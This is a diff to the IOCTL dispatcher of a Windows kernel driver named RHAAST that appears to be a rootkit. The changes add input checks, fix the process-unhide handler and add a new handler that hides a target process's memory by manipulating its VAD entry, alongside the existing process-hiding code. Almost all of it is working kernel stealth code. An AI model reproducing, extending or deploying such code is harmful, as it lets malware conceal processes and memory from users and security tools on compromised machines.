@@ -34,7 +34,7 @@ NTSTATUS TsIoCtlInit(
     NTSTATUS       NtStatus   = STATUS_SUCCESS;
 
     /* set pointers */
-    Instance.DriverObject->MajorFunction[ IRP_MJ_CREATE ]         = TsIoCtlCreateClose;
+    Instance.DriverObject->MajorFunction[ IRP_MJ_CREATE ]         = 
     Instance.DriverObject->MajorFunction[ IRP_MJ_CLOSE  ]         = TsIoCtlCreateClose;
     Instance.DriverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL ] = TsIoCtlDispatch;
 
@@ -92,7 +92,13 @@ NTSTATUS TsIoCtlDispatch(
         case RHAAST_IOCTL_PROCESS_HIDE: PUTS( "RHAAST_IOCTL_PROCESS_HIDE" )
         {
             ULONG Pid = 0;
-            
+
+            /* check if param has been specified */
+            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
+                NtStatus = STATUS_INVALID_PARAMETER;
+                break;
+            }
+
             /* check data input size */
             if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( ULONG ) ) {
                 NtStatus = STATUS_INVALID_BUFFER_SIZE;
@@ -108,7 +114,7 @@ NTSTATUS TsIoCtlDispatch(
                     PRINTF( "Failed to hide process: %p\n", NtStatus )
                     break;
                 }
-
+                
                 PRINTF( "Process Hidden: %d\n", Pid )
             } else {
                 NtStatus = STATUS_INVALID_PARAMETER;
@@ -121,25 +127,63 @@ NTSTATUS TsIoCtlDispatch(
         {
             ULONG Pid = 0;
 
+            /* check if param has been specified */
+            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
+                NtStatus = STATUS_INVALID_PARAMETER;
+                break;
+            }
+
             /* check data input size */
             if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( ULONG ) ) {
                 NtStatus = STATUS_INVALID_BUFFER_SIZE;
                 break;
             }
 
-            /* get process id & hide process */
+            /* get process id & unhide process */
             if ( Irp->AssociatedIrp.SystemBuffer ) {
                 Pid = * ( PULONG ) Irp->AssociatedIrp.SystemBuffer;
 
-                /* hide process */
-                if ( ! NT_SUCCESS( NtStatus = ProcessHide( Pid ) ) ) {
-                    PRINTF( "Failed to hide process: %p\n", NtStatus )
+                /* unhide process */
+                if ( ! NT_SUCCESS( NtStatus = ProcessUnHide( Pid ) ) ) {
+                    PRINTF( "Failed to unhide process: %p\n", NtStatus )
                     break;
                 }
-
-                PRINTF( "Process Hidden: %d\n", Pid )
+                
+                PRINTF( "Process UnHidden: %d\n", Pid )
             } else {
                 NtStatus = STATUS_INVALID_PARAMETER;
+            }
+
+            break;
+        }
+
+        case RHAAST_IOCTL_MEMORY_VAD: PUTS( "RHAAST_IOCTL_MEMORY_VAD" )
+        {
+            PRS_C_MEMORY_VAD MemoryVad = NULL;
+
+            /* check if param has been specified */
+            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
+                NtStatus = STATUS_INVALID_PARAMETER;
+                break;
+            }
+
+            /* check data input size */
+            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_MEMORY_VAD ) ) {
+                NtStatus = STATUS_INVALID_BUFFER_SIZE;
+                break;
+            }
+
+            MemoryVad = Irp->AssociatedIrp.SystemBuffer;
+
+            if ( MemoryVad->Hide ) 
+            {
+                /* hide memory by manipulating the VAD entry of virtual address */
+                if ( ! NT_SUCCESS( NtStatus = MemoryVadHide( MemoryVad->Pid, MemoryVad->Address ) ) ) {
+                    PRINTF( "Failed to hide VAD: Pid:[%ld] Address:[%p] Status:[%p]\n", MemoryVad->Pid, MemoryVad->Address, NtStatus )
+                    break; 
+                }
+            } else {
+                // MemoryVadUnHide( MemoryVad->Pid, MemoryVad->Address );
             }
 
             break;
